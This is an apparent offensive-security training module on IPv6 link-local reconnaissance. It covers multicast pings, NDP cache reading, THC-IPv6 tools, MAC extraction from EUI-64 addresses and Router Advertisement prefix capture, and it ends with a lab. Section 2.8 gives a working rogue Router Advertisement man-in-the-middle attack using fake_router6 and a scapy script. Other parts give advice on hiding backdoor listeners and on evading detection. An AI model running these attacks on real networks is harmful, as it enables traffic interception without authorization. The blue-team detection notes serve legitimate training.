# Link-Local Discovery

**Roadmap:** Phase 2: Offensive Core → Part 4: Footprinting and Reconnaissance → Stage 5: IPv6 & Protocol Enumeration

# Section 1 — What it is and where it sits

Link-local IPv6 addresses (range `fe80::/10`) are automatically configured on every IPv6-capable interface without any manual configuration, DHCP server, or router. They are the foundation of IPv6 neighbor communication — they exist before global addresses are assigned and persist even when global address configuration fails. Because they are generated automatically, they are present on virtually every modern server, workstation, and network device without any administrator awareness or intentional configuration.

Link-local addresses are non-routable — they cannot cross a router. This makes them invisible to external scanning. However, from an internal network position (post-ARP poisoning, pivot via compromised host, or VPN with internal access), link-local addresses reveal a complete inventory of all IPv6-capable devices on the segment, including devices that have no global IPv6 address and no AAAA record in DNS.

```text
Stage 5 — Link-Local Discovery
────────────────────────────────────────────────────────────────────
Internal position gained  →  [Link-Local Discovery]  →  Full segment map
(ARP poison / pivot host)      ↑ YOU ARE HERE              incl. devices
(VPN / direct LAN)             fe80::/10 addresses          with no DNS
                               ff02::1 multicast ping       no AAAA record
                               ip -6 neigh / alive6         new hosts found
────────────────────────────────────────────────────────────────────
```

---

# Section 2 — How attackers actually use this

## 2.1 Link-local address generation mechanics (SLAAC / EUI-64)

Every network interface generates its link-local address automatically using SLAAC (Stateless Address Autoconfiguration). The process:

```text
Step 1: Start with the link-local prefix: fe80::/10 (fe80:: through febf::)
Step 2: Generate a 64-bit interface identifier:
  Option A — EUI-64 from MAC:
    MAC: aa:bb:cc:dd:ee:ff
    → Insert ff:fe in middle: aa:bb:cc:ff:fe:dd:ee:ff
    → Flip bit 6 of first byte (universal/local bit): aa XOR 0x02 = a8
    → Interface ID: a8bb:ccff:fedd:eeff
    → Link-local: fe80::a8bb:ccff:fedd:eeff
  
  Option B — Privacy extension (RFC4941):
    Generates a random interface ID instead of EUI-64
    → Link-local: fe80::<random 64 bits>
    → Less predictable but still discoverable via NDP

Step 3: Perform DAD (Duplicate Address Detection) to ensure uniqueness
Step 4: Address is ready — before any router or DHCP interaction
```

The implication: even a host with no static IPv6 configuration, no DHCP server, no router — has a link-local address. A Windows Server with IPv6 "not configured" has a fe80:: address on every NIC. This is automatic and inescapable on any modern OS.

## 2.2 Discovering all link-local hosts with ff02::1 multicast

The multicast address `ff02::1` is the "all IPv6 nodes" address — every IPv6-enabled host on the segment is a member of this multicast group and must respond to pings sent to it.

```bash
# Check your own link-local address and interface
$ ip -6 addr show eth0
2: eth0:
    inet6 fe80::a8bb:ccff:fedd:1234/64 scope link
         valid_lft forever preferred_lft forever

# Ping all-nodes multicast to discover all IPv6 hosts on segment
# CRITICAL: must specify interface with %iface — link-local requires interface scope
$ ping6 -c 3 ff02::1%eth0

PING ff02::1%eth0(ff02::1%eth0) from fe80::a8bb:ccff:fedd:1234 eth0: 56 data bytes
64 bytes from fe80::1%eth0: icmp_seq=1 ttl=64 time=0.543 ms    ← router!
64 bytes from fe80::a8bb:ccff:fedd:5678%eth0: icmp_seq=1 ttl=64 time=1.234 ms  ← host
64 bytes from fe80::a8bb:ccff:feaa:bbcc%eth0: icmp_seq=1 ttl=64 time=2.567 ms  ← host
64 bytes from fe80::1234:5678:9abc:def0%eth0: icmp_seq=1 ttl=64 time=1.890 ms  ← host

# Results: 4 link-local hosts discovered including the router (fe80::1)
```

The hosts responding to `ff02::1` are every IPv6-enabled device on the segment. This includes devices that have no global IPv6 address and therefore would not appear in any DNS query, Shodan search, or external scan.

## 2.3 Neighbor Discovery Protocol (NDP) — IPv6's ARP replacement

NDP is the IPv6 protocol replacing ARP for MAC-to-IP resolution. It uses ICMPv6 messages:
- **Neighbor Solicitation (NS):** "Who has this IPv6 address?" (equivalent to ARP Request)
- **Neighbor Advertisement (NA):** "I have this IPv6 address, my MAC is X." (equivalent to ARP Reply)
- **Router Solicitation (RS):** "Is there a router on this segment?"
- **Router Advertisement (RA):** Router announcing presence and prefix information.

```bash
# View the NDP neighbor cache (like arp -n but for IPv6)
$ ip -6 neigh show
fe80::1%eth0              dev eth0 lladdr aa:bb:cc:11:22:33 router REACHABLE
fe80::a8bb:ccff:fedd:5678 dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE
fe80::a8bb:ccff:feaa:bbcc dev eth0 lladdr 11:22:33:aa:bb:cc REACHABLE

# The NDP table shows:
# - fe80::1 is the router (router flag)
# - Two other hosts with their MAC addresses

# Force NDP resolution for a specific address
$ ping6 -c 1 fe80::a8bb:ccff:fedd:5678%eth0
$ ip -6 neigh show | grep "fedd:5678"
fe80::a8bb:ccff:fedd:5678 dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE
# → MAC aa:bb:cc:dd:ee:ff belongs to the host at fe80::...fedd:5678
```

## 2.4 alive6 from THC-IPv6 for automated discovery

`alive6` sends ICMPv6 Echo Requests to the all-nodes multicast address and listens for responses, automatically building a list of all responding link-local addresses:

```bash
# Install THC-IPv6 toolkit
$ sudo apt install thc-ipv6

# Discover all alive IPv6 hosts on the segment
$ sudo alive6 eth0

Alive: fe80::1%eth0 [router]
Alive: fe80::a8bb:ccff:fedd:5678%eth0
Alive: fe80::a8bb:ccff:feaa:bbcc%eth0
Alive: fe80::1234:5678:9abc:def0%eth0

Found 4 systems alive on eth0

# More aggressive: also send probes to common link-local addresses
$ sudo alive6 -p eth0   # includes prefix scanning

# detect-new-ip6: monitors for new hosts appearing on the segment (continuous)
$ sudo detect-new-ip6 eth0
Detected new IPv6 address: fe80::a8bb:ccff:feed:1234 (AA:BB:CC:EE:12:34)
# → Alerts when a new host joins the segment

# Passive NDP snooping with ndpwatch or tshark
$ sudo tshark -i eth0 -Y "icmpv6.type == 136 or icmpv6.type == 135" \
  -T fields -e ipv6.src -e icmpv6.nd.na.target_address
# Captures all Neighbor Advertisement messages — reveals every IPv6 host communicating
```

## 2.5 Correlating link-local MAC with EUI-64 for identity confirmation

Most EUI-64 link-local addresses embed the host's MAC address. Given a link-local address, you can reverse-engineer the MAC:

```bash
# Reverse EUI-64: extract MAC from link-local address
# Link-local: fe80::a8bb:ccff:fedd:eeff
# Interface ID: a8bb:ccff:fedd:eeff

# Python: reverse EUI-64 to MAC
$ python3 -c "
link_local = 'fe80::a8bb:ccff:fedd:eeff'
# Extract interface ID (last 64 bits)
iid = link_local.split('::')[1]
# Expand to full form
parts = iid.split(':')
# Re-expand any compressed groups
full = [p.zfill(4) for p in parts]
# Extract bytes
bytes_list = []
for p in full:
    bytes_list.extend([p[:2], p[2:]])
# Remove ff:fe (inserted at positions 3 and 4)
mac_bytes = bytes_list[:3] + bytes_list[5:]
# Flip bit 6 of first byte
mac_bytes[0] = format(int(mac_bytes[0], 16) ^ 0x02, '02x')
mac = ':'.join(mac_bytes)
print(f'MAC: {mac}')
"
MAC: aa:bb:cc:dd:ee:ff

# Look up MAC OUI to identify vendor
$ curl -s "https://api.macvendors.com/aa:bb:cc" 2>/dev/null
Apple, Inc.   ← developer workstation likely
```

Once you have the MAC from the link-local address, MAC OUI lookup identifies the hardware vendor — Cisco (router/switch), VMware (virtual machine), Apple (workstation), Raspberry Pi (IoT/embedded). This feeds directly into the live host inventory and OS fingerprinting.

## 2.6 Router discovery and prefix extraction

Router Advertisement (RA) messages contain the network prefix that SLAAC uses to generate global unicast addresses. Listening for RA messages reveals:

```bash
# Listen for Router Advertisements (carries IPv6 prefix information)
$ sudo tshark -i eth0 -Y "icmpv6.type == 134" \
  -T fields -e ipv6.src -e icmpv6.nd.ra.cur_hop_limit -e icmpv6.nd.ra.flag \
  -e icmpv6.opt.prefix

fe80::1  64  0x80  2001:db8:1234:5678   ← prefix from router!

# → The global prefix being advertised is 2001:db8:1234:5678::/64
# → You now have the prefix for predicting EUI-64 global addresses (note 01)

# Actively solicit Router Advertisement
$ sudo rdisc6 eth0
Soliciting ICMPv6 RA on eth0 from fe80::a8bb:ccff:fedd:1234...

Hop limit                 :   64 (      0x40)
Stateful address conf.    :   No
Stateful other conf.      :   No
Mobile home agent         :   No
Router preference         :   medium
Neighbor discovery proxy  :   No
Router lifetime           : 1800 (0x00000708) seconds
Reachable time            :    0 (0x00000000) milliseconds
Retransmit time           :    0 (0x00000000) milliseconds

Prefix                    : 2001:db8:1234:5678::/64     ← confirmed prefix
  On-link                 :  Yes
  Autonomous address      :  Yes
  Valid time              : 2592000 seconds
  Pref. time              : 604800 seconds

from fe80::1
```

## 2.7 Link-local as an evasion and persistence mechanism

Link-local addresses survive IPv4 firewall rule changes. An operator who configures a backdoor listener on a link-local address may evade detection by IPv4-focused monitoring:

```bash
# Bind a listener on a link-local address (persistence example — informational)
# An implant listening only on fe80:: is invisible to IPv4 monitoring tools
# netstat / ss shows only the IPv6 socket — IPv4-focused monitoring misses it

# Detection from blue team side:
$ ss -6 -tnl | grep "fe80"   ← check for link-local listeners
$ ip -6 neigh show            ← NDP table shows all link-local peers

# From recon perspective:
# If a host has an open port on its link-local address but NOT on its global IPv4:
# → This may be a backdoor or internal management interface
$ nmap -6 -sV fe80::a8bb:ccff:fedd:5678%eth0
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4
8888/tcp open  http     Jupyter Notebook   ← Jupyter bound to link-local!
# → Jupyter accessible only from the same segment — likely developer tool
```

## 2.8 Rogue Router Advertisement — IPv6 MitM via NDP

IPv6's equivalent of ARP poisoning is the Rogue Router Advertisement attack. An attacker sends forged RA messages claiming to be the default IPv6 router. Because SLAAC accepts RA messages from any source (no authentication), all hosts on the segment update their default route to point through the attacker's machine — giving complete MitM position for all IPv6 traffic.

```bash
# Rogue RA with THC-IPv6 fake_router6
# Position as the default IPv6 router for the segment
$ sudo fake_router6 eth0 2001:db8:1234:5678::/64

# → All hosts on segment update their IPv6 default route to your machine
# → All IPv6 traffic flows through you before reaching the real router

# Enable IPv6 forwarding (forward traffic to avoid connectivity loss)
$ sudo sysctl -w net.ipv6.conf.eth0.forwarding=1

# Capture MitM traffic
$ sudo tcpdump -i eth0 -6 -w ipv6_mitm.pcap "not icmpv6"

# Rogue RA with scapy (manual control)
$ python3 - << 'EOF'
from scapy.all import *
from scapy.layers.inet6 import *

# Construct Router Advertisement packet
ra = IPv6(dst="ff02::1") / \
     ICMPv6ND_RA(routerlifetime=1800) / \
     ICMPv6NDOptPrefixInfo(
         prefix="2001:db8:1234:5678::",
         prefixlen=64,
         validlifetime=3600,
         preferredlifetime=1800
     )

# Send continuously
for _ in range(5):
    sendp(Ether(dst="33:33:00:00:00:01") / ra, iface="eth0", verbose=False)
    time.sleep(1)
print("Rogue RA sent — monitoring for traffic")
EOF

# Compare with detection:
# IPv6 RA Guard (similar to DHCP Snooping) on switches blocks rogue RAs
# ra-guard configured on enterprise switches → rogue RA attack fails
# → If your rogue RA fails to redirect traffic → RA Guard is configured → defensive intel

# Detection from blue side:
# Every host receives the RA and logs a default route change
# ndpmon detects unexpected RA sources and alerts
# Windows Event Log: EventID 10-NDIS events on route change
```

The operational implication of rogue RA success: every IPv6 connection from every host on the segment flows through your machine. Unlike ARP poisoning (which targets individual hosts), a successful rogue RA attack redirects the entire segment's default traffic path simultaneously. However, the same traffic volume that gives complete coverage also makes detection immediate on monitored segments.

```bash
# Verification: did the rogue RA change routing on a target?
# On the target host (post-exploitation check):
$ ip -6 route show default
default via fe80::a8bb:ccff:fedd:1234 dev eth0   ← your fe80 address is now the gateway!
# Previously would show the legitimate router fe80::1
```

## 2.9 Link-local address stability and re-enumeration strategy

Link-local addresses generated via EUI-64 are permanent — they are derived from the MAC address and do not change across reboots or SLAAC renewals. Link-local addresses generated via privacy extensions (RFC4941) may change daily on client systems (Windows and macOS randomize the IID by default) but are typically static on servers.

```bash
# Determine if a link-local address is EUI-64 or privacy-generated
# EUI-64 addresses contain 'ff:fe' in the interface ID:
# fe80::a8bb:ccff:fedd:eeff → a8bb:cc[ff:fe]dd:eeff → EUI-64 (stable)

# Privacy extension addresses are fully random:
# fe80::1234:5678:9abc:def0 → no ff:fe pattern → privacy extension (may change daily)

# Check if a Windows host has privacy extensions enabled:
# (From post-exploitation, or if you can read the host's network config)
$ netsh interface ipv6 show privacy    # Windows command
# PrivacyAddresses: Enabled → interface IDs change periodically

# Linux privacy extensions:
$ sysctl net.ipv6.conf.eth0.use_tempaddr
net.ipv6.conf.eth0.use_tempaddr = 2   ← enabled (2 = prefer temp address)

# Servers (Linux/Windows Server) typically disable privacy extensions:
net.ipv6.conf.eth0.use_tempaddr = 0   ← disabled → stable EUI-64 address

# Impact on re-enumeration cadence:
# EUI-64 hosts: link-local address is permanent → enumerate once, valid indefinitely
# Privacy-extension hosts (Windows workstations): link-local changes every 24h by default
# → Re-run alive6 daily if targeting Windows workstations
# → Servers use stable EUI-64 → single enumeration per engagement

# Practical check: are observed link-local addresses EUI-64 or random?
$ python3 -c "
addresses = [
    'fe80::a8bb:ccff:fedd:eeff',   # contains ccff:fedd → ff:fe pattern → EUI-64
    'fe80::1234:5678:9abc:def0',   # no ff:fe pattern → privacy extension
]
for addr in addresses:
    iid = addr.split('::')[1].replace(':','')
    is_eui64 = 'fffe' in iid.lower()
    print(f'{addr}: {\"EUI-64 (stable)\" if is_eui64 else \"Privacy extension (may change)\"}')
"
```

Knowing whether a host uses EUI-64 or privacy-extension addressing tells you two things: (1) whether you can reliably return to the same link-local address in a future session, and (2) whether the link-local address embeds a real MAC address (EUI-64 → extract MAC → OUI vendor lookup) or is completely random (privacy extension → no MAC embedded → no vendor info from the address alone).

---

# Section 3 — Core concepts and terminology

| Term | Definition |
|------|-----------|
| **Link-local** | IPv6 address range `fe80::/10` — automatically generated, non-routable, single-segment only |
| **ff02::1** | IPv6 all-nodes multicast address — every IPv6-enabled host on segment responds to pings here |
| **ff02::2** | IPv6 all-routers multicast address — all IPv6 routers respond to pings here |
| **NDP** | Neighbor Discovery Protocol — IPv6 replacement for ARP; uses ICMPv6 messages |
| **Neighbor Solicitation (NS)** | ICMPv6 type 135 — IPv6 ARP Request equivalent: "Who has this address?" |
| **Neighbor Advertisement (NA)** | ICMPv6 type 136 — IPv6 ARP Reply equivalent: "I have this address" |
| **Router Advertisement (RA)** | ICMPv6 type 134 — router announces prefix, gateway, and SLAAC parameters |
| **Router Solicitation (RS)** | ICMPv6 type 133 — host requesting a Router Advertisement |
| **SLAAC** | Stateless Address Autoconfiguration — auto-generates IPv6 addresses from RA prefix + EUI-64 |
| **DAD** | Duplicate Address Detection — verifies a newly generated address is not already in use |
| **Interface scope** | Link-local addresses require `%interface` suffix for routing: `fe80::1%eth0` |
| **alive6** | THC-IPv6 tool discovering all live IPv6 hosts via ff02::1 multicast |
| **rdisc6** | Tool actively soliciting Router Advertisements to extract prefix information |
| **detect-new-ip6** | THC-IPv6 tool continuously monitoring for new IPv6 hosts appearing on the segment |
| **EUI-64 embedded MAC** | Link-local addresses generated via EUI-64 contain the host's MAC — extractable |

---

# Section 4 — Tools and commands

| Tool | Command | What it finds | When to use |
|------|---------|--------------|------------|
| `ping6 ff02::1%eth0` | `ping6 -c 3 ff02::1%eth0` | All link-local hosts | LAN access |
| `ip -6 neigh` | `ip -6 neigh show` | NDP cache (link-local + MAC) | After ping discovery |
| `alive6` | `sudo alive6 eth0` | All live link-local hosts | Automated sweep |
| `rdisc6` | `sudo rdisc6 eth0` | IPv6 prefix from RA | Prefix discovery |
| `tshark` | `tshark -i eth0 -Y "icmpv6.type==134"` | Passive RA capture | Passive prefix discovery |
| `nmap -6` | `nmap -6 -sV fe80::X%eth0` | Services on link-local | Post-discovery |

**Complete link-local discovery pipeline:**
```bash
IFACE="eth0"

# Step 1: Check our own link-local address
$ ip -6 addr show $IFACE | grep "fe80"

# Step 2: Discover all hosts via all-nodes multicast
$ sudo ping6 -c 5 ff02::1%$IFACE 2>&1 | grep "bytes from" | awk '{print $4}' \
  | sed 's/%eth0//' | sort -u > link_local_hosts.txt

# Step 3: Populate NDP cache for all discovered hosts
$ while read host; do ping6 -c 1 "${host}%$IFACE" >/dev/null 2>&1; done < link_local_hosts.txt

# Step 4: Read NDP table (IPs + MACs)
$ ip -6 neigh show | tee ndp_table.txt

# Step 5: Extract MACs and look up vendors
$ awk '{print $5}' ndp_table.txt | grep -v "^$" | sort -u | while read mac; do
    vendor=$(curl -s "https://api.macvendors.com/$mac" 2>/dev/null)
    echo "$mac → $vendor"
  done | tee mac_vendors.txt

# Step 6: Extract IPv6 global prefix from Router Advertisement
$ sudo rdisc6 $IFACE 2>/dev/null | grep "Prefix" | head -3

# Step 7: Port scan all discovered link-local hosts
$ while read host; do
    echo "=== $host ==="
    nmap -6 -sV -p 22,80,443,8080,8888 "${host}%$IFACE" 2>/dev/null | grep "open"
  done < link_local_hosts.txt | tee link_local_services.txt
```

---

# Section 5 — Defender detection

- **ff02::1 multicast ping:** All-nodes multicast generates ICMPv6 Echo Requests visible to every host on the segment. A standard `ping6 ff02::1` from an unexpected source IP is detectable by any host monitoring ICMPv6 traffic. Security tools like `ndpmon` explicitly alert on unexpected NDP probing.
- **alive6:** Generates a burst of ICMPv6 probes visible to all hosts and any monitoring system on the segment. Much more obvious than a simple ping.
- **NDP table reading:** `ip -6 neigh show` reads local kernel state — produces no network traffic. Completely silent.
- **rdisc6 (Router Solicitation):** Sends a single Router Solicitation multicast — this is normal network behavior (all hosts do this on boot) and generates no alert.
- **Passive tshark capture:** Capturing RA/NS/NA messages is entirely passive — no traffic generated.
- **Mitigation for operators:** The most stealthy approach: (1) Passively read the NDP cache after gaining segment access — it populates automatically from normal traffic. (2) Capture RA messages passively to get the prefix. (3) Only use active probes (alive6, ping6 ff02::1) when passive cache is insufficient.

---

# Section 6 — Lab task

**Platform:** Kali Linux on a local network with other IPv6-enabled devices, or a lab with multiple VMs with IPv6 enabled.

**Objective:** Discover all link-local hosts on your lab segment without using IPv4 at all.

**Steps:**

1. **Check link-local address:** `ip -6 addr show eth0 | grep fe80` — note your own link-local
2. **All-nodes multicast ping:** `ping6 -c 5 ff02::1%eth0` — list all responding IPs
3. **Router discovery:** `ping6 -c 3 ff02::2%eth0` — identify IPv6 routers
4. **NDP cache:** `ip -6 neigh show` — correlate link-local IPs with MAC addresses
5. **alive6 sweep:** `sudo alive6 eth0` — compare with manual ping results
6. **Router Advertisement:** `sudo rdisc6 eth0` — extract the global IPv6 prefix
7. **MAC vendor lookup:** For each MAC in the NDP table, look up the OUI vendor
8. **Passive NDP capture:** `sudo tshark -i eth0 -c 100 -Y "icmpv6.type == 136" -T fields -e ipv6.src -e eth.src`
9. **Port scan one link-local host:** `nmap -6 -sV -p 22,80,443 fe80::1%eth0` — document services
10. **Compile `link_local_map.md`:** Table with Link-Local IP | MAC | Vendor | Is Router | Services found | Predicted global IPv6 (from prefix + EUI-64)

```bash
git commit -m "recon(stage5): link-local discovery — <N> hosts on segment via NDP"
```

---

# Section 7 — Common mistakes

**1. Forgetting the `%interface` scope identifier**
_Why it matters:_ `ping6 fe80::1` fails — link-local addresses are not routable and require the interface to be specified. The kernel does not know which interface to use.
_Fix:_ Always append `%interface` to link-local addresses: `ping6 fe80::1%eth0`, `ssh user@fe80::1%eth0`, `nmap -6 fe80::1%eth0`.

**2. Using only the NDP cache for host discovery without active probing**
_Why it matters:_ The NDP cache only contains entries for hosts that have recently communicated with your machine. Hosts that haven't sent or received traffic to/from you are not in the cache — you'll miss them.
_Fix:_ First ping `ff02::1%eth0` to elicit responses from all hosts, then read the NDP cache. The cache is now populated with all responding hosts.

**3. Not associating link-local addresses with their MAC addresses**
_Why it matters:_ The link-local address alone doesn't identify the device. The MAC in the NDP table gives you the hardware vendor (Cisco router, VMware VM, Apple workstation) and, if EUI-64 is used, lets you reverse-engineer the MAC from the link-local address.
_Fix:_ Always correlate: `ip -6 neigh show` gives IP+MAC pairs. OUI lookup from the MAC identifies the vendor.

**4. Not using passive capture first on high-security segments**
_Why it matters:_ On segments with ndpmon or full-packet IDS coverage, active ff02::1 pings are immediately detected. Passive NDP snooping (tshark watching for NA messages) is invisible but requires waiting for hosts to communicate.
_Fix:_ On sensitive segments, spend 1-2 minutes passively capturing NDP traffic before any active probes. Normal network activity generates continuous NA/NS messages that reveal all active hosts.

---

# Section 8 — Move-on gate

1. You're on an internal network segment with IPv6 enabled. `ip -6 neigh show` shows no entries. Without notes, explain why the cache is empty, state the exact command and address to send a multicast ping to discover all IPv6 hosts on the segment, and explain why you must include `%eth0` in the command.

2. `ping6 ff02::1%eth0` reveals a host at `fe80::a8bb:ccff:fedd:eeff`. Without notes, explain whether this address was generated via EUI-64 or privacy extensions, extract the MAC address embedded in this link-local address, and identify the MAC OUI lookup step.

3. `sudo rdisc6 eth0` returns `Prefix: 2001:db8:1234:5678::/64`. You know the MAC of an internal server from SNMP: `00:50:56:ab:cd:ef`. Without notes, calculate the complete global IPv6 address for this server using EUI-64.
